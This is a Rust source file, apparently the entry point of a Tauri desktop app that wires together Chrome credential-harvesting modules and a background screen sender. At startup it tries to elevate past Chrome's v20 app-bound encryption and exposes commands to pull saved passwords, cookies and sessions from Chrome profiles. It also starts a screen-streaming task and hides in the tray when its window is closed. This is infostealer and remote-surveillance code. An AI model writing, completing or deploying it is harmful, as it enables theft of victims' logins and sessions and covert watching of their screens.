mod chrome;
mod chrome_abe;
mod chrome_ielevator;
pub mod chrome_elevation;
mod fs_handler;
mod screen;
mod win_single_instance;

use std::sync::Arc;

use screen::{load_or_create_sender_id, ScreenSender, ScreenSenderConfig};
use tauri::{
    tray::TrayIconBuilder,
    Manager, RunEvent, WindowEvent,
};

fn desktop_monitor_point(app: &tauri::AppHandle) -> Option<(i32, i32)> {
    let window = app.get_webview_window("main")?;
    let pos = window.outer_position().ok()?;
    let size = window.outer_size().ok()?;
    Some((
        pos.x + size.width as i32 / 2,
        pos.y + size.height as i32 / 2,
    ))
}

struct AppState {
    sender: Arc<ScreenSender>,
}

#[cfg(windows)]
type InstanceHandle = win_single_instance::InstanceGuard;

#[cfg(not(windows))]
type InstanceHandle = ();

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    #[cfg(windows)]
    {
        let Some(instance) = win_single_instance::acquire_instance_after_stop() else {
            return;
        };

        if !chrome_elevation::ensure_chrome_v20_elevation() {
            chrome_elevation::show_elevation_failed_message();
            std::process::exit(1);
        }

        run_with_instance(instance);
        return;
    }

    #[cfg(not(windows))]
    {
        let _ = chrome_elevation::ensure_chrome_v20_elevation();
        run_with_instance(());
    }
}

fn run_with_instance(instance: InstanceHandle) {
    let _instance_guard = instance;

    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![
            chrome::chrome_list_profiles,
            chrome::chrome_analyze_passwords,
            chrome::chrome_analyze_cookies,
            chrome::chrome_analyze_sessions,
        ])
        .setup(move |app| {
            TrayIconBuilder::new().build(app)?;

            let app_handle = app.handle().clone();
            let monitor_point = Arc::new(move || desktop_monitor_point(&app_handle));
            let sender_id = load_or_create_sender_id();
            let config = ScreenSenderConfig {
                sender_id,
                monitor_point: Some(monitor_point),
                ..ScreenSenderConfig::default()
            };
            let sender = Arc::new(
                ScreenSender::new(config).expect("Error was occurred"),
            );
            let sender_for_task = Arc::clone(&sender);
            tauri::async_runtime::spawn(async move {
                let _ = sender_for_task.run().await;
            });
            app.manage(AppState { sender });

            Ok(())
        })
        .on_window_event(|window, event| {
            if let WindowEvent::CloseRequested { api, .. } = event {
                api.prevent_close();
                let _ = window.hide();
            }
        })
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|app_handle, event| {
            if let RunEvent::Exit = event {
                if let Some(state) = app_handle.try_state::<AppState>() {
                    state.sender.stop();
                }
            }
        });
}
